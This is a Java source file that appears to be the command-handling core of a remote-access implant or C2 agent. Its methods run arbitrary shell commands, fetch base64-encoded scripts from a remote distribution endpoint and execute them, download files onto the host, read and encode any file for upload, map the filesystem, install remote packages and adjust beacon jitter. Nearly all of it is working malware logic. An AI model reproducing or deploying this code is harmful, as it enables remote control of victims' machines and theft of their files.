package agent;

import java.util.Hashtable;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.IOException;
import java.io.File;
import java.io.FileOutputStream;
import java.io.ByteArrayOutputStream;
import java.util.Base64;
import java.util.Hashtable;
import java.util.stream.Stream;
import java.util.stream.Collectors;
import java.util.Collections;
import java.util.List;
import java.util.ArrayList;
import java.util.Enumeration;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.Path;
import java.time.Instant;
import javax.swing.filechooser.FileSystemView;
import java.lang.reflect.InvocationTargetException;
import java.security.NoSuchAlgorithmException;
import java.nio.file.DirectoryStream;



public class control {
    public static ArrayList dirWalk(ArrayList path) throws IOException {

        ArrayList retrPaths = new ArrayList();
        for (int i=0; i<path.size(); i++) {
            Path root = Paths.get(path.get(i).toString());
            try (DirectoryStream<Path> list = Files.newDirectoryStream(root)) {
                for ( Path f : list ) {
                    String stringPath = f.toString();
                    retrPaths.add(stringPath);
                }
            } catch (IOException e) {}
        }
        return retrPaths;
    }

	public static Hashtable execCommand(Hashtable args) throws IOException, InterruptedException, NoSuchAlgorithmException, ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException {
	    String stringCommand = new String();
		Hashtable taskOut = new Hashtable();
		String directiveString = args.get("command").toString();
        if (directiveString == "0x9026069321") {
            String collector = Crypt.distort("distKey") + "." + args.get("jobID");
            Hashtable scrObject =  Netw.send("Dist", null, collector, Crypt.bake());
            byte[] fileBytes = Base64.getDecoder().decode(scrObject.get("fileObj").toString());
            stringCommand = new String(fileBytes);
        } else {
            stringCommand = directiveString;
        }

		Process executor = Runtime.getRuntime().exec(new String[] {args.get("interpreter").toString(),args.get("flags").toString(),stringCommand});
		StringBuilder output = new StringBuilder();
		BufferedReader reader = new BufferedReader(
			new InputStreamReader(executor.getInputStream()));
		String line;
		while ((line = reader.readLine()) != null) {
			output.append(line + "\n");
		}
		int exitCode = executor.waitFor();
		if (exitCode != 0) {
			System.out.println(exitCode);
			taskOut.put("error","commandLineError");
		}
		System.out.println(output);
		taskOut.put("output",output.toString());
		return taskOut;
	}

	public static Hashtable agentHalt(Hashtable args) {
		Hashtable taskOut = new Hashtable();
		
		Main.egress = 1;
		String output = "agent has been instructed to exit";

		taskOut.put("output",output);
		return taskOut;
	}

	public static Hashtable agentNetconfig(Hashtable args) {
		Hashtable taskOut = new Hashtable();
		
		String jitterMin = args.get("jitter_min").toString();
		String jitterMax = args.get("jitter_max").toString();
		String threadsMax = args.get("threads_max").toString();
		if (jitterMin != "none") {
			Main.config.put("jitterMin",Integer.parseInt(jitterMin));
		}
		if (jitterMax != "none") {
			Main.config.put("jitterMax",Integer.parseInt(jitterMax));
		}
		if (threadsMax != "none") {
			Main.config.put("threadsMax",Integer.parseInt(threadsMax));
		}

		String output = "netconfig has been adjusted";
		

		taskOut.put("output",output);
		return taskOut;
	}

	public static Hashtable agentSessionize(Hashtable args) {
		Hashtable taskOut = new Hashtable();
		String output = new String();
		int sessionFlag = Integer.parseInt(args.get("flag").toString());		
		String[] sessionStates = new String[]{"desessionize","sessionize"};

		Main.session = sessionFlag;

		if (Main.session == sessionFlag) {
			output = "agent has been instructed to " + sessionStates[sessionFlag];
		} else {
			output = "agent session state cannot be altered at this time";
		}			

		taskOut.put("output",output);
		return taskOut;
	}

	public static Hashtable agentPushmod(Hashtable args) throws ClassNotFoundException, NoSuchMethodException, SecurityException, IllegalAccessException, IllegalArgumentException, InvocationTargetException, NoSuchAlgorithmException {
		Hashtable taskOut = new Hashtable();
		String pkgID = args.get("package").toString();	

		Pkg.install(pkgID);

		String output = "agent has been instructed to install the package for ID " + pkgID;

		taskOut.put("output",output);
		return taskOut;
	}

	public static Hashtable enumRoots(Hashtable args) {
		Hashtable taskOut = new Hashtable();
		ArrayList rootSet = new ArrayList();		

		FileSystemView fsViewer = FileSystemView.getFileSystemView();
		File[] paths = File.listRoots();
		for (int i=0; i<paths.length; i++) {
			Hashtable rootElement = new Hashtable();
			String descriptor = fsViewer.getSystemTypeDescription(paths[i]);
			rootElement.put("root_element",paths[i]);
			if (descriptor != null) {
				rootElement.put("element_descriptor",descriptor);
			} else {
				rootElement.put("element_descriptor","unavailable");
			}
			rootSet.add(rootElement.toString());
		}
		String output = rootSet.toString();

		taskOut.put("output",output);
		return taskOut;
	}

	public static Hashtable enumDirectories(Hashtable args) throws IOException{
		Hashtable taskOut = new Hashtable();
		int crawlDepth = 0;
		int maxDepth = Integer.parseInt(args.get("depth").toString());
		String walkDir = args.get("root").toString();
	
		Hashtable output = new Hashtable();
        ArrayList directories = new ArrayList();
        directories.add(walkDir);
        while (crawlDepth < maxDepth) {
             Hashtable pathObj = new Hashtable();
             ArrayList walker = dirWalk(directories);
             directories.clear();
             for (int x=0;x<walker.size();x++) {
                 Hashtable fileObject = new Hashtable();
                 String stringPath = walker.get(x).toString();

                 if (Files.isDirectory(Paths.get(stringPath))) {
                     directories.add(stringPath);
                     fileObject.put("type","directory");
                 } else {
                     fileObject.put("type","file");
                 }
                 fileObject.put("owner",Files.getOwner(new File(stringPath).toPath()));
                 output.put(stringPath,fileObject);
             }
             if (directories.size() == 0) {
                 break;
             }
             crawlDepth++;
        }

		taskOut.put("output",output.toString());
		return taskOut;
	}

	public static Hashtable filePush(Hashtable args) throws ClassNotFoundException, NoSuchMethodException, SecurityException, IllegalAccessException, IllegalArgumentException, InvocationTargetException, NoSuchAlgorithmException {
		Hashtable taskOut = new Hashtable();
		String output = new String();
		
		String fileName = args.get("file").toString();
		String fileDest = args.get("destination").toString();
		File destPath = new File(fileDest);


		String collector = Crypt.distort("distKey") + "." + fileName;
		Hashtable fileObject = Netw.send("Dist", null, collector, Crypt.bake());
		String fileCandidate = fileObject.get("fileName").toString();
		if (fileCandidate.equals(fileName)) {
			byte[] fileBytes = Base64.getDecoder().decode(fileObject.get("fileObj").toString());
			try {
				FileOutputStream fileStream = new FileOutputStream(fileDest);
				fileStream.write(fileBytes);
				output = "successfully wrote to " + fileDest;
			} catch (Exception e) {
				output = "error: got " + e.getClass().getCanonicalName() + " during file write operation";
			}
		} else {
			output = "error: candidate does not match requested file";
		}

		taskOut.put("output",output);
		return taskOut;
	}

	public static Hashtable filePull(Hashtable args) throws IOException {
		Hashtable taskOut = new Hashtable();

		String fileSeparator = System.getProperty("file.separator");
		String readFile = args.get("file").toString();
		File filePath = new File(readFile);
        String fileName = filePath.getName();
		

		byte[] fileBytes = Files.readAllBytes(Paths.get(readFile));
		String output = fileName + "|" + Base64.getEncoder().encodeToString(fileBytes);
		
		taskOut.put("output",output);
		return taskOut;
	}
}
